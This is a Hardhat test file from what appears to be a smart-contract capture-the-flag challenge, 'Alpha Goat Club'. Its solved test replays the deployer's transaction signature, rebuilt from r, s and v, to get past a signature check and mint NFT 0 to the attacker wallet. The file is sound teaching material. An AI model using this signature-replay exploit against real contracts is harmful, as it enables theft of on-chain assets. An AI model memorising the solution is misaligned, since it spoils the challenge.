const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Alpha Goat Club";

describe(NAME, function () {
    async function setup() {
        const [, attacker] = await ethers.getSigners();

        const AlphaGoatClub = await (await ethers.getContractFactory("AlphaGoatClubPrototypeNFT")).deploy();

        return {
            attacker,
            AlphaGoatClub,
        };
    }

    describe("exploit", async function () {
        let attacker, AlphaGoatClub;

        before(async function () {
            ({ attacker, AlphaGoatClub } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            // Your exploit here
            /**
             * The goal is to use the attacker wallet to mint the NFT at index 0 to itself.
             */
            const pending = await AlphaGoatClub.connect(attacker).commit();
            for (let i = 0; i < 5; i++) {
                await network.provider.send("evm_mine");
            }
            const txHash = AlphaGoatClub.deployTransaction.hash;
            const tx = await ethers.provider.getTransaction(txHash);
            const unsignedTx = {
                type: 2,
                nonce: tx.nonce,
                to: tx.to,
                value: tx.value,
                data: tx.data,
                chainId: tx.chainId,
                gasLimit: tx.gasLimit,
                maxFeePerGas: tx.maxFeePerGas,
                maxPriorityFeePerGas: tx.maxPriorityFeePerGas,
            };
            // Compute the digest (hash) that was signed
            const hash = ethers.utils.keccak256(ethers.utils.serializeTransaction(unsignedTx));
            // Reconstruct the ECDSA signature from r, s, v
            const signature = ethers.utils.joinSignature({
                r: tx.r,
                s: tx.s,
                v: tx.v,
            });

            await AlphaGoatClub.connect(attacker).exclusiveBuy(0, hash, signature);
        });

        after(async function () {
            expect(await AlphaGoatClub.ownerOf(0)).to.equal(attacker.address);

            expect(await ethers.provider.getTransactionCount(attacker.address)).to.lessThan(
                3,
                "must exploit in two transactions or less"
            );
        });
    });
});
